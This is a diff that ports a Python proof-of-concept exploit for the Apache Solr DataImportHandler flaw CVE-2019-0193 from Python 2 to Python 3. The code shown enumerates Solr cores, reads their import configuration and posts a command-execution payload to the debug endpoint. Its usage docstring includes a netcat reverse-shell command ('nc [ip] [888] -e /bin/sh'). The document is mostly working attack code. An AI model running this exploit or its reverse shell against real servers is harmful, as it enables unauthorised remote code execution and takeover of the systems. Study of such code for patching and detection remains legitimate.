@@ -17,23 +17,23 @@ Usage:
 	python CVE-2019-0193.py http://192.168.2.18:8983 "calc"
 	python CVE-2019-0193.py http://192.168.2.18:8983 "nc [ip] [888] -e /bin/sh"
 '''
-print banner
+print(banner)
 
 def admin_cores(url, cmd):
     core_selector_url = url + '/solr/admin/cores?_=1565526689592&indexInfo=false&wt=json'
     r = requests.get(url=core_selector_url)
     json_strs = json.loads(r.text)
     if r.status_code ==200 and "responseHeader" in r.text:
-        print "\nHere Have %s Core_name Exit!\n" % str(len(json_strs['status']))
+        print("\nHere Have %s Core_name Exit!\n" % str(len(json_strs['status'])))
         for core_selector in json_strs['status']:
             jas502n_Core_Name = json_strs['status']['%s'%core_selector]['name']
-            print '\n>>>>The Core Name = %s' % jas502n_Core_Name
+            print('\n>>>>The Core Name = %s' % jas502n_Core_Name)
             show_config(url,jas502n_Core_Name)
             get_config_name(url,jas502n_Core_Name)
             URLDataSource_Poc(url,jas502n_Core_Name,cmd)
             
     else:
-        print "No core_selector Exit!"
+        print("No core_selector Exit!")
     
 
 
@@ -43,10 +43,10 @@ def show_config(url,jas502n_Core_Name):
     r1 = requests.get(config_url)
     
     if r1.status_code ==200 and 'dataConfig' in r1.text:
-        print ">> config_url= %s"% config_url
-        print ">%s dataConfig Exist!" % jas502n_Core_Name
+        print(">> config_url= %s"% config_url)
+        print(">%s dataConfig Exist!" % jas502n_Core_Name)
     else:
-        print "dataConfig No Exit!"
+        print("dataConfig No Exit!")
 
 
 
@@ -54,14 +54,14 @@ def get_config_name(url,jas502n_Core_Name):
     get_config_url = url + '/solr/'+ jas502n_Core_Name +'/dataimport?_=1565530241159&command=status&indent=on&wt=json'
     r2 = requests.get(get_config_url)
     if r2.status_code ==200 and 'config' in r2.text:
-        print ">> get_config_url= %s" % get_config_url
+        print(">> get_config_url= %s" % get_config_url)
         r2_json = json.loads(r2.text)
         r2_str = r2_json['initArgs']
         
-        print '>get_config_name= %s' % r2_str[1][1]
+        print('>get_config_name= %s' % r2_str[1][1])
         
     else:
-        print "Core Config Name No Exit!"
+        print("Core Config Name No Exit!")
 
 
 
@@ -79,13 +79,13 @@ def URLDataSource_Poc(url,jas502n_Core_Name,cmd):
 
     }
     r3 = requests.post(url = debug_model_url, data=payload,headers=headers)
-    print ">>>>> debug_model_url= %s" % debug_model_url
+    print(">>>>> debug_model_url= %s" % debug_model_url)
     if r3.status_code ==200 and 'Requests' in r3.text:
 
-        print "Send Poc Success!"
+        print("Send Poc Success!")
     else:
-        print "No Send Poc Success!"
-        print r3.text
+        print("No Send Poc Success!")
+        print(r3.text)
 
 
 
